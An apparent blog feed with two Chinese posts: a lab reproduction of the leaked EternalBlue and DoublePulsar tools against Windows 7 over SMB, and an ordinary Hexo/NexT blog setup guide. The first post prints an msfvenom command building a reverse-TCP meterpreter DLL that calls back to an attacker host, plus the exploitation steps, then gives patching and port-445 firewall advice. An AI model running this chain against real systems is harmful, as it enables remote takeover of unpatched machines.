      <content type="html"><![CDATA[<p>2017年4月14日，Shadow Brokers 再次公开了大量从 NSA 的方程式组织（Equation Group）处窃取的攻击工具，这些工具主要针对 Windows 系统的漏洞，其中还有几个 0 day。工具中的 fuzzbunch 是一个类似于 metasploit 的漏洞利用框架，fb.py 是 fuzzbunch 的入口文件，通过该文件可以调用各攻击模块。</p>
<p>泄露的工具可在 Github 下载：<a href="https://github.com/misterch0c/shadowbroker" target="_blank" rel="external">https://github.com/misterch0c/shadowbroker</a></p>
<h3 id="0x01-影响范围"><a href="#0x01-影响范围" class="headerlink" title="0x01 影响范围"></a><strong>0x01 影响范围</strong></h3><p>下图中列举了工具中相关模块所影响的服务和系统。<br><img src="http://ooyovxue7.bkt.clouddn.com/17-4-28/92526918-file_1493343199647_16966.jpg" alt=""></p>
<h3 id="0x02-漏洞测试"><a href="#0x02-漏洞测试" class="headerlink" title="0x02 漏洞测试"></a><strong>0x02 漏洞测试</strong></h3><p>下面使用工具中的 fuzzbunch 框架、Eternalblue 和 Doublepulsar 测试 Windows 下的 SMB 漏洞。首先通过 Eternalblue 利用 MS17-010 漏洞攻击 Windows 系统；然后在 Kali Linux 中用 Metasploit 生成一个能建立反向连接的 DLL，并在 Kali 中监听相应端口；最后使用 Doublepulsar 远程注入恶意 DLL 到目标系统，注入成功后 Kali 将与目标系统建立连接。</p>
<h4 id="1-测试环境"><a href="#1-测试环境" class="headerlink" title="1. 测试环境"></a><strong>1. 测试环境</strong></h4><table>
<thead>
<tr>
<th style="text-align:left">PC</th>
<th style="text-align:left">IP</th>
<th>用途</th>
<th>备注</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">Win 7 x64</td>
<td style="text-align:left">192.168.109.1</td>
<td>攻击机</td>
<td>需安装 <a href="https://www.python.org/ftp/python/2.6.6/python-2.6.6.msi" target="_blank" rel="external">python2.6</a>  和 <a href="https://sourceforge.net/projects/pywin32/files/pywin32/Build%20221/pywin32-221.win32-py2.6.exe/download" target="_blank" rel="external">pywin32</a></td>
</tr>
<tr>
<td style="text-align:left">Win 7 x86</td>
<td style="text-align:left">192.168.109.132</td>
<td>靶机</td>
<td>开启 SMB 服务（445端口）</td>
</tr>
<tr>
<td style="text-align:left">Kali Linux</td>
<td style="text-align:left">192.168.109.128</td>
<td>控制端</td>
<td>生成payload 并控制回连会话</td>
</tr>
</tbody>
</table>
<p>首先需要把工具中的 windows 拷贝到攻击机 Win 7 x64中，然后在 windows 目录下新建一个 listeningposts 文件夹。</p>
<h4 id="2-测试流程"><a href="#2-测试流程" class="headerlink" title="2. 测试流程"></a><strong>2. 测试流程</strong></h4><h5 id="1）运行-fuzzbunch-框架"><a href="#1）运行-fuzzbunch-框架" class="headerlink" title="1）运行 fuzzbunch 框架"></a><strong>1）运行 fuzzbunch 框架</strong></h5><p>在 cmd 中进入 windows 目录，运行 <code>python fb.py</code>。输入目标系统 IP（Win 7 x86）和攻击机 IP（Win 7 x64），输入“no” 不重定向，接着输入项目名新建一个项目。<br><img src="http://ooyovxue7.bkt.clouddn.com/17-4-28/95094523-file_1493344655277_8614.png" alt="">   </p>
<h5 id="2）调用-Eternalblue-攻击系统"><a href="#2）调用-Eternalblue-攻击系统" class="headerlink" title="2）调用 Eternalblue 攻击系统"></a><strong>2）调用 Eternalblue 攻击系统</strong></h5><p>运行<code>use Eternalblue</code>，然后大多数步骤只需按回车使用默认参数即可。<br><img src="http://ooyovxue7.bkt.clouddn.com/17-4-28/54184530-file_1493344922256_adf5.png" alt=""><br>下面需要选择 <code>1）FB</code> 模式。<br><img src="http://ooyovxue7.bkt.clouddn.com/17-4-28/61786740-file_1493345114952_f2f3.png" alt=""><br>接着继续回车，直到成功运行攻击模块。<br><img src="http://ooyovxue7.bkt.clouddn.com/17-4-28/73280707-file_1493345362094_157db.png" alt=""></p>
<h5 id="3）Metasploit-生成恶意-DLL"><a href="#3）Metasploit-生成恶意-DLL" class="headerlink" title="3）Metasploit 生成恶意 DLL"></a><strong>3）Metasploit 生成恶意 DLL</strong></h5><p>在 Kali Linux 下使用 Metasploit 生成恶意 DLL,它将在目标系统中建立一个反向连接。这里生成的 DLL必须要与目标系统版本一致，下面生成 32 bit 的 DLL。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.109.128 LPORT=6666 -f dll &gt; test.dll</div></pre></td></tr></table></figure></p>
<p>之后需要将生成的 test.dll 拷贝到攻击机的 D:\下。</p>
<h5 id="4）开启-msf-监听"><a href="#4）开启-msf-监听" class="headerlink" title="4）开启 msf 监听"></a><strong>4）开启 msf 监听</strong></h5><p>在 Kali Linux 下，运行 msf，监听 6666 端口。<br><img src="http://ooyovxue7.bkt.clouddn.com/17-4-28/80220500-file_1493346556508_101d9.png" alt="">   </p>
<h5 id="5）调用-Doublepulsar-注入-DLL"><a href="#5）调用-Doublepulsar-注入-DLL" class="headerlink" title="5）调用 Doublepulsar 注入 DLL"></a><strong>5）调用 Doublepulsar 注入 DLL</strong></h5><p>回到攻击机中，执行 <code>use Doublepulsar</code> ，回车使用默认参数直到选择 Function 为2 注入 DLL，然后指定 DLL 的路径。<br><img src="http://ooyovxue7.bkt.clouddn.com/17-4-28/11038492-file_1493347262266_5c5.png" alt=""><br>注入成功后将返回如下信息。<br><img src="http://ooyovxue7.bkt.clouddn.com/17-4-28/68357990-file_1493347997057_2e1f.png" alt=""><br>但是这里也会出现个问题，多次注入之后目标系统会出错重启。<br><img src="http://ooyovxue7.bkt.clouddn.com/17-4-28/56721083-file_1493348716416_6f00.png" alt=""></p>
<h5 id="6）建立连接"><a href="#6）建立连接" class="headerlink" title="6）建立连接"></a><strong>6）建立连接</strong></h5><p>DLL 注入到目标系统之后，Kali Linux 将与目标系统建立连接。<br><img src="http://ooyovxue7.bkt.clouddn.com/17-4-28/82624178-file_1493348105266_34db.png" alt=""></p>
<h3 id="0x03-防御措施"><a href="#0x03-防御措施" class="headerlink" title="0x03 防御措施"></a><strong>0x03 防御措施</strong></h3><h4 id="1-尽快升级系统补丁"><a href="#1-尽快升级系统补丁" class="headerlink" title="1. 尽快升级系统补丁"></a><strong>1. 尽快升级系统补丁</strong></h4><h4 id="2-开启防火墙，并限制-445-端口"><a href="#2-开启防火墙，并限制-445-端口" class="headerlink" title="2. 开启防火墙，并限制 445 端口"></a><strong>2. 开启防火墙，并限制 445 端口</strong></h4><p>通过以下命令添加防火墙规则：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">netsh advfirewall firewall add rule name=&quot;445&quot; protocol=TCP dir=in localport=445 action=block</div></pre></td></tr></table></figure></p>
<hr>
<p>References:<br>[1] <a href="http://blog.injectxx.com/2017/04/18/%E5%A4%8D%E7%8E%B0%E7%AC%94%E8%AE%B0%E3%80%82/" target="_blank" rel="external">NSA工具包之0day Eternalblue 复现笔记</a><br>[2] <a href="https://www.exploit-db.com/docs/41896.pdf" target="_blank" rel="external">HOW TO EXPLOIT ETERNALBLUE &amp; DOUBLEPULSAR TO GET AN<br>EMPIRE/METERPRETER SESSION ON WINDOWS 7/2008</a><br>[3] <a href="https://www.vulbox.com/knowledge/detail/?id=6" target="_blank" rel="external">NSA Fuzzbunch分析与利用案例</a></p>
]]></content>
      
        <categories>
            
            <category> Exploit </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Enternalblue </tag>
            
            <tag> Doublepulsar </tag>
            
            <tag> NSA </tag>
            
            <tag> SMB </tag>
            
            <tag> Metasploit </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Github+Hexo+NexT搭建个人博客]]></title>
      <url>/Github+Hexo+NexT%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/</url>
      <content type="html"><![CDATA[<p>平时在网上查文档的时候经常能看到一些非常好的博客，然后就想着自己也搭一个，一方面可以记录一些问题的解决方法，以便查阅，另一方面希望能促使自己多总结，多写文档。所以，经过这几天的折腾，终于把基本功能都搭好了。下面是搭建过程的记录，以下操作在 ubuntu14.04 x86_64中进行。</p>
<h3 id="0x01-安装Node-js"><a href="#0x01-安装Node-js" class="headerlink" title="0x01 安装Node.js"></a><strong>0x01 安装Node.js</strong></h3><h4 id="1）通过nvm安装Node-js"><a href="#1）通过nvm安装Node-js" class="headerlink" title="1）通过nvm安装Node.js"></a><strong>1）通过nvm安装Node.js</strong></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">$ curl https://raw.githubusercontent.com/creationix/nvm/master/install.sh | sh</div><div class="line">$ nvm ls-remote</div><div class="line">$ nvm install v7.9.0</div></pre></td></tr></table></figure>
<h4 id="2）测试"><a href="#2）测试" class="headerlink" title="2）测试"></a><strong>2）测试</strong></h4><p>安装完后可以新建一个简单的 hello.js 测试是否安装成功，hello.js 代码如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">var http = require(&apos;http&apos;);</div><div class="line">http.createServer(function(req, res)&#123;</div><div class="line">    res.writeHead(200, &#123;&apos;Content-Type&apos;: &apos;text/plain&apos;&#125;);</div><div class="line">    res.end(&apos;Hello World\n&apos;);</div><div class="line">&#125;).listen(8808, &apos;127.0.0.1&apos;);</div><div class="line">console.log(&apos;Server running at http://127.0.0.1:8808&apos;);</div></pre></td></tr></table></figure></p>
<p>进入该文件所在目录，在终端输入<code>node hello_node.js</code>，然后用浏览器打开<code>http://127.0.0.1:8808</code> 即可看到 “Hello Word”。</p>
<h3 id="0x02-安装与配置Github"><a href="#0x02-安装与配置Github" class="headerlink" title="0x02 安装与配置Github"></a><strong>0x02 安装与配置Github</strong></h3><h4 id="1）安装Git"><a href="#1）安装Git" class="headerlink" title="1）安装Git"></a><strong>1）安装Git</strong></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ sudo apt-get install git-core</div></pre></td></tr></table></figure>
<h4 id="2）配置ssh-keys"><a href="#2）配置ssh-keys" class="headerlink" title="2）配置ssh keys"></a><strong>2）配置ssh keys</strong></h4><p>首先检查现有的 ssh key：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ cd ~/.ssh</div></pre></td></tr></table></figure></p>
<p>如果没有 key 则生成新的 ssh key：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">$ ssh-keygen -t rsa -C &quot;your email@163.com&quot;</div><div class="line">Generating public/private rsa key pair.</div><div class="line">Enter file in which to save the key (/home/xx/.ssh/id_rsa):</div></pre></td></tr></table></figure></p>
<p>按回车键后提示输入密码，该密码用于提交项目时的验证，可防止别人往你的项目里提交内容。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">Enter passphrase (empty for no passphrase):</div><div class="line">Enter same passphrase again:</div></pre></td></tr></table></figure></p>
<p>成功生成 ssh key 之后可以看到以下内容：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">$ ls</div><div class="line">id_rsa  id_rsa.pub  known_hosts</div></pre></td></tr></table></figure></p>
<p>在本地生成 ssh key 后需要添加到 Github 上，点击<code>Setting-&gt;SSH and GPG keys-&gt;New SSH key</code>，将 id_rsa.pub 中的内容复制到Key中。</p>
<h4 id="3）测试"><a href="#3）测试" class="headerlink" title="3）测试"></a><strong>3）测试</strong></h4><p>配置好后可以测试一下，执行 <code>$ ssh -T git@github.com</code>，若返回以下内容则配置成功！<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Hi xx! You&apos;ve successfully authenticated, but GitHub does not provide shell access.</div></pre></td></tr></table></figure></p>
<h4 id="4）设置用户信息"><a href="#4）设置用户信息" class="headerlink" title="4）设置用户信息"></a><strong>4）设置用户信息</strong></h4><p>Git 会根据用户的名字和邮箱来记录提交。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">$ git config --global user.name &quot;your name&quot;</div><div class="line">$ git config --global user.email &quot;your email on github&quot;</div></pre></td></tr></table></figure></p>
<h3 id="0x03-安装与配置Hexo"><a href="#0x03-安装与配置Hexo" class="headerlink" title="0x03 安装与配置Hexo"></a><strong>0x03 安装与配置Hexo</strong></h3><h4 id="1）安装-Hexo"><a href="#1）安装-Hexo" class="headerlink" title="1）安装 Hexo"></a><strong>1）安装 Hexo</strong></h4><p>进入需建立博客的目录，输入以下命令安装Hexo：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ npm install hexo-cli -g</div></pre></td></tr></table></figure></p>
<p>以后可以使用<code>$ nmp update hexo –g</code>命令更新Hexo。</p>
<h4 id="2）初始化"><a href="#2）初始化" class="headerlink" title="2）初始化"></a><strong>2）初始化</strong></h4><p>安装 Hexo 完成后，在当前博客目录下列命令，Hexo 将会在指定文件夹中新建所需要的文件：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">$ hexo init &lt;folder&gt;</div><div class="line">$ cd &lt;folder&gt;</div><div class="line">$ npm install</div></pre></td></tr></table></figure></p>
<p>初始化完成后，指定文件夹的目录如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">.</div><div class="line">├── _config.yml	// 网站的 配置信息，可以在此配置大部分的参数</div><div class="line">├── package.json	// 应用程序的信息</div><div class="line">├── scaffolds	// 模版文件夹。新建文章时，Hexo 会根据 scaffold 来建立文件</div><div class="line">├── source		// 资源文件夹是存放用户资源的地方</div><div class="line">|   ├── _drafts</div><div class="line">|   └── _posts</div><div class="line">└── themes	// 主题 文件夹。Hexo 会根据主题来生成静态页面</div></pre></td></tr></table></figure></p>
<h4 id="3）测试-1"><a href="#3）测试-1" class="headerlink" title="3）测试"></a><strong>3）测试</strong></h4><p>配置好后启动服务器，在浏览器中访问<code>http://localhost:4000/</code>可以看到一篇默认文章。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">$ hexo server</div><div class="line">INFO  Start processing</div><div class="line">INFO  Hexo is running at http://localhost:4000/. Press Ctrl+C to stop.</div></pre></td></tr></table></figure></p>
<h3 id="0x04-部署到Github"><a href="#0x04-部署到Github" class="headerlink" title="0x04 部署到Github"></a><strong>0x04 部署到Github</strong></h3><h4 id="1）创建github仓库"><a href="#1）创建github仓库" class="headerlink" title="1）创建github仓库"></a><strong>1）创建github仓库</strong></h4><p>点击右上角“+”-&gt; new repository，输入Repository name 为<code>yourname.github.io</code>，yourname 必须与 git 用户名一致，并且这将会是 blog 的域名。</p>
<h4 id="2）修改配置文件"><a href="#2）修改配置文件" class="headerlink" title="2）修改配置文件"></a><strong>2）修改配置文件</strong></h4><p>修改_config.yml文件中的参数，将Hexo与github上的仓库关联。修改如下，注意冒号后面有一个空格：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"># Deployment</div><div class="line">## Docs: https://hexo.io/docs/deployment.html</div><div class="line">deploy:</div><div class="line">  type: git</div><div class="line">  repo: https://github.com/yourname/yourname.github.io</div><div class="line">  branch: master</div><div class="line">  message:</div></pre></td></tr></table></figure></p>
<p>参数描述：</p>
<table>
<thead>
<tr>
<th style="text-align:left">参数</th>
<th style="text-align:left">描述</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">repo</td>
<td style="text-align:left">库（Repository）地址</td>
</tr>
<tr>
<td style="text-align:left">branch</td>
<td style="text-align:left">分支名称。如果您使用的是 GitHub 或 GitCafe 的话，程序会尝试自动检测。</td>
</tr>
<tr>
<td style="text-align:left">message</td>
<td style="text-align:left">自定义提交信息 ( 默认为 Site updated:now(‘YYYY-MM-DD HH:mm:ss’))</td>
</tr>
</tbody>
</table>
<h4 id="3）安装-hexo-deployer-git"><a href="#3）安装-hexo-deployer-git" class="headerlink" title="3）安装 hexo-deployer-git"></a><strong>3）安装 hexo-deployer-git</strong></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ npm install hexo-deployer-git --save</div></pre></td></tr></table></figure>
<h4 id="4）部署到github"><a href="#4）部署到github" class="headerlink" title="4）部署到github"></a><strong>4）部署到github</strong></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">$ hexo deploy</div><div class="line">INFO  Start processing</div><div class="line">...</div><div class="line">INFO  Deploy done: git</div></pre></td></tr></table></figure>
<p>成功后就可以通过浏览器访问<code>https://yourname.github.io/</code>。</p>
<h3 id="0x05-使用NexT主题"><a href="#0x05-使用NexT主题" class="headerlink" title="0x05 使用NexT主题"></a><strong>0x05 使用NexT主题</strong></h3><p>Hexo 安装主题的方式非常简单，只需要将主题文件拷贝至站点目录的 themes 目录下， 然后修改下配置文件即可。</p>
<h4 id="1）下载主题"><a href="#1）下载主题" class="headerlink" title="1）下载主题"></a><strong>1）下载主题</strong></h4><p>下载完后复制到themes目录下。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">git clone https://github.com/iissnan/hexo-theme-next.git</div></pre></td></tr></table></figure></p>
<h4 id="2）修改配置文件-1"><a href="#2）修改配置文件-1" class="headerlink" title="2）修改配置文件"></a><strong>2）修改配置文件</strong></h4><p>打开 Blog 目录下站点配置文件 _config.yml，将 theme 修改给主题文件夹名称。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"># Extensions</div><div class="line">## Plugins: https://hexo.io/plugins/</div><div class="line">## Themes: https://hexo.io/themes/</div><div class="line">theme: next</div></pre></td></tr></table></figure></p>
<h4 id="3）测试-2"><a href="#3）测试-2" class="headerlink" title="3）测试"></a><strong>3）测试</strong></h4><p>执行 <code>$ hexo s --debug</code> 验证主题是否启用，在浏览器中访问<code>http://localhost:4000</code>，查看效果。</p>
<h3 id="0x06主题优化"><a href="#0x06主题优化" class="headerlink" title="0x06主题优化"></a><strong>0x06主题优化</strong></h3><p>主题目录下同样有一个配置文件 _config.yml，可以修改相关参数对主题做修改。</p>
<h4 id="选择外观"><a href="#选择外观" class="headerlink" title="选择外观"></a><strong>选择外观</strong></h4><p>找到 Scheme 可以选择不同的外观。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"># Schemes</div><div class="line">#scheme: Muse</div><div class="line">scheme: Mist</div><div class="line">#scheme: Pisces</div></pre></td></tr></table></figure></p>
<h4 id="设置语言"><a href="#设置语言" class="headerlink" title="设置语言"></a><strong>设置语言</strong></h4><p>打开站点配置文件，修改 language 字段。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">language: en</div></pre></td></tr></table></figure></p>
<h4 id="设置头像"><a href="#设置头像" class="headerlink" title="设置头像"></a><strong>设置头像</strong></h4><p>将头像放置主题目录下的 <code>source/uploads/</code>，修改 avatar 字段。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">avatar: /uploads/avatar.jpg</div></pre></td></tr></table></figure></p>
<h4 id="设置RSS"><a href="#设置RSS" class="headerlink" title="设置RSS"></a><strong>设置RSS</strong></h4><p>1）安装插件。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ npm install hexo-generator-feed</div></pre></td></tr></table></figure></p>
<p>2）设置站点配置文件，添加以下内容：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"># Plugins</div><div class="line">## RSS</div><div class="line">feed:</div><div class="line">  type: atom	#feed type: atom or rss2</div><div class="line">  path: atom.xml	#feed path</div><div class="line">  limit: 20</div><div class="line">  hub:</div><div class="line">  content:</div></pre></td></tr></table></figure></p>
<h4 id="添加标签-tags-页面"><a href="#添加标签-tags-页面" class="headerlink" title="添加标签[tags]页面"></a><strong>添加标签[tags]页面</strong></h4><p>1）首先，执行<code>$ hexo new page tags</code> 新建tags 页面，然后修改刚新建的页面：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">---</div><div class="line">title: tags</div><div class="line">date: 2017-04-19 21:18:05</div><div class="line">type: &quot;tags&quot;</div><div class="line">comments: false</div><div class="line">---</div></pre></td></tr></table></figure></p>
<p>2）编辑文章时，通过以下方式设置文章标签：<br><code>tages: [标签1,标签2,...标签n]</code></p>
<h4 id="添加分类-categories-页面"><a href="#添加分类-categories-页面" class="headerlink" title="添加分类[categories]页面"></a><strong>添加分类[categories]页面</strong></h4><p>执行<code>$ hexo new page tags</code> 新建一个页面，然后修改刚新建的页面：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">---</div><div class="line">title: categories</div><div class="line">date: 2017-04-19 21:25:38</div><div class="line">type: &quot;catgories&quot;</div><div class="line">comments: false</div><div class="line">---</div></pre></td></tr></table></figure></p>
<h4 id="设置分类"><a href="#设置分类" class="headerlink" title="设置分类"></a><strong>设置分类</strong></h4><p>修改站点配置文件中category_map 字段设置分类名。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"># Category &amp; Tag</div><div class="line">default_category: uncategorized</div><div class="line">category_map:</div><div class="line">  Category1:</div><div class="line">  Category2:</div><div class="line">  Category3:</div><div class="line">tag_map:</div></pre></td></tr></table></figure></p>
<h4 id="设置代码高亮"><a href="#设置代码高亮" class="headerlink" title="设置代码高亮"></a><strong>设置代码高亮</strong></h4><p>修改站点配置文件中 highlight_theme 字段。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">highlight_theme: night bright</div></pre></td></tr></table></figure></p>
<h4 id="修改文章内链样式"><a href="#修改文章内链样式" class="headerlink" title="修改文章内链样式"></a><strong>修改文章内链样式</strong></h4><p>将内链设置为蓝色，鼠标选中时显示下划线。在 <code>themes/next/source/css/_custom/custom.styl</code> 中添加如下样式：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">.post-body p a &#123;</div><div class="line">  color: #0593d3;</div><div class="line">  border-bottom: none;</div><div class="line">  &amp;:hover &#123;</div><div class="line">    color: #0477ab;</div><div class="line">    text-decoration: underline;</div><div class="line">  &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<h4 id="图片居中"><a href="#图片居中" class="headerlink" title="图片居中"></a><strong>图片居中</strong></h4><p>修改<code>/themes/next/source/css/_schemes/Mist/</code>目录下的 _posts-expanded.styl。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">.post-body img &#123; margin: 0 ; &#125;</div><div class="line">改为</div><div class="line">.post-body img &#123; margin: 0 auto; &#125;</div></pre></td></tr></table></figure></p>
<h4 id="设置站点logo"><a href="#设置站点logo" class="headerlink" title="设置站点logo"></a><strong>设置站点logo</strong></h4><p>通过网站 favicon 在线制作制作 favicon 图片，把图片放在<code>/themes/next/source/image</code> 目录中，然后修改主题配置文件：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">favicon: images/favicon.ico</div></pre></td></tr></table></figure></p>
<h4 id="首页文章摘要"><a href="#首页文章摘要" class="headerlink" title="首页文章摘要"></a><strong>首页文章摘要</strong></h4><p>在首页只显示文章部分摘要，点击 “Read more” 查看全文。修改主题配置文件：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">auto_excerpt:</div><div class="line">  enable: true</div><div class="line">  length: 150</div></pre></td></tr></table></figure></p>
<h4 id="更改内容区域的宽度"><a href="#更改内容区域的宽度" class="headerlink" title="更改内容区域的宽度"></a><strong>更改内容区域的宽度</strong></h4><p>编辑主题的 <code>source/css/_variables/custom.styl</code> 文件，新增变量：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">// change width when width of screen &lt; 1600px</div><div class="line">$content-desktop = 800px</div><div class="line">// change width when width of screen &gt;= 1600px</div><div class="line">$content-desktop-large = 1000px</div></pre></td></tr></table></figure></p>
<h4 id="访客量与阅读量统计"><a href="#访客量与阅读量统计" class="headerlink" title="访客量与阅读量统计"></a><strong>访客量与阅读量统计</strong></h4><p>使用不蒜子统计，修改主题配置文件的 busuanzi_count 的配置项：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">busuanzi_count:</div><div class="line">  # count values only if the other configs are false</div><div class="line">  enable: true</div><div class="line">  # custom uv span for the whole site</div><div class="line">  site_uv: true</div><div class="line">  site_uv_header: 访客数</div><div class="line">  site_uv_footer: 人次</div><div class="line">  # custom pv span for the whole site</div><div class="line">  site_pv: true</div><div class="line">  site_pv_header: 总访问量</div><div class="line">  site_pv_footer: 次</div><div class="line">  # custom pv span for one page only</div><div class="line">  page_pv: true</div><div class="line">  page_pv_header: 阅读次数</div><div class="line">  page_pv_footer:</div></pre></td></tr></table></figure></p>
<h4 id="添加本地搜索"><a href="#添加本地搜索" class="headerlink" title="添加本地搜索"></a><strong>添加本地搜索</strong></h4><p>使用NexT主题内置的本地站内搜索，执行 <code>$ npm install hexo-generator-search --save</code> 安装插件，然后在站点配置文件中，添加以下内容到任意位置。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">path: search.xml</div><div class="line">field: post</div><div class="line">format: html</div><div class="line">limit: 10000</div></pre></td></tr></table></figure></p>
<p>编辑主题配置文件：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"># Local search</div><div class="line">local_search:</div><div class="line">  enable: true</div></pre></td></tr></table></figure></p>
<h4 id="添加评论功能"><a href="#添加评论功能" class="headerlink" title="添加评论功能"></a><strong>添加评论功能</strong></h4><p>next 主题支持 Disqus，Hypercomments，网易云跟贴等多种第三方评论系统，这里采用网易云跟帖。<br>1）首先，登录网易云跟帖，填写站点信息，其中，站点网站为 blog 地址，要求必须为独立域名，github.io 无法收录。<br>2）然后点击获取代码，进行皮肤和功能的设置。<br>3）最后点击 APP SDK 获取 KEY。修改blog主题配置文件，将key填入相应字段。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"># Gentie productKey</div><div class="line">gentie_productKey: xxxxxxxxxxxxxxxxxxxxxxxxxxx</div></pre></td></tr></table></figure></p>
<p>4）重新部署 blog 即可生效。</p>
<h3 id="0x07-域名绑定"><a href="#0x07-域名绑定" class="headerlink" title="0x07 域名绑定"></a><strong>0x07 域名绑定</strong></h3><h4 id="1）购买域名"><a href="#1）购买域名" class="headerlink" title="1）购买域名"></a><strong>1）购买域名</strong></h4><p>首先需要购买一个域名，我是在腾讯云买的，支付后要进行实名认证才能正常使用。</p>
<h4 id="2）创建-CNAME"><a href="#2）创建-CNAME" class="headerlink" title="2）创建 CNAME"></a><strong>2）创建 CNAME</strong></h4><p>在 blog 目录下的 source 文件夹中新建文件 CNAME，并将域名写入该文件。之后重新部署blog。</p>
